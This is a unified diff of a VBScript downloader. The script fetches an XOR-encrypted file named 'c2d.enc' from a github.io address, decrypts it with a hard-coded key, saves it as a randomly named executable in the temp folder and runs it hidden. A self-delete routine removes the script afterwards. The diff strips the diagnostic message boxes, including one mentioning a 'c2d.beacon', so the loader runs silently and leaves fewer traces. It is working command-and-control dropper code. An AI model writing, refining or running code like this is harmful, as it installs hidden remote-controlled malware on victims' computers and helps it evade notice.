@@ -12,31 +12,25 @@ x.Open "GET", "https://kai195102.github.io/d/c2d.enc", False
 x.Send
 If x.Status <> 200 Then MsgBox "FAIL: HTTP " & x.Status: SelfDestruct
 raw = x.ResponseBody
-If VarType(raw) <> 8209 Then MsgBox "FAIL: VarType=" & VarType(raw): SelfDestruct
+If VarType(raw) <> 8209 Then SelfDestruct
 key = Array(&H3A, &H97, &H79, &HB0)
-n = UBound(raw)
-ReDim data(n)
-For i = 0 To n
-  data(i) = CByte(raw(i) Xor key((i Mod 4)))
+n = UBound(raw) : lb = LBound(raw)
+ReDim dst(n - lb)
+For i = lb To n
+  dst(i - lb) = CByte(raw(i) Xor key(((i - lb) Mod 4)))
 Next
 Set fso = CreateObject("Scripting.FileSystemObject")
-If fso Is Nothing Then MsgBox "FAIL: No FSO": SelfDestruct
+If fso Is Nothing Then SelfDestruct
 tmp = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".exe"
 Set stream = CreateObject("ADODB.Stream")
-If stream Is Nothing Then MsgBox "FAIL: No ADODB.Stream": SelfDestruct
+If stream Is Nothing Then SelfDestruct
 stream.Type = 1
 stream.Open
-stream.Write data
+stream.Write dst
 stream.SaveToFile tmp, 2
 stream.Close
-If fso.FileExists(tmp) Then
-  MsgBox "OK: File written to " & tmp
-Else
-  MsgBox "FAIL: File not created at " & tmp: SelfDestruct
-End If
 Set shell = CreateObject("WScript.Shell")
 shell.Run tmp, 0, False
-MsgBox "OK: Launched " & tmp & ". Check %TEMP% for c2d.beacon and c2d.log"
 Sub SelfDestruct
   Set fso = CreateObject("Scripting.FileSystemObject")
   fso.DeleteFile WScript.ScriptFullName, True
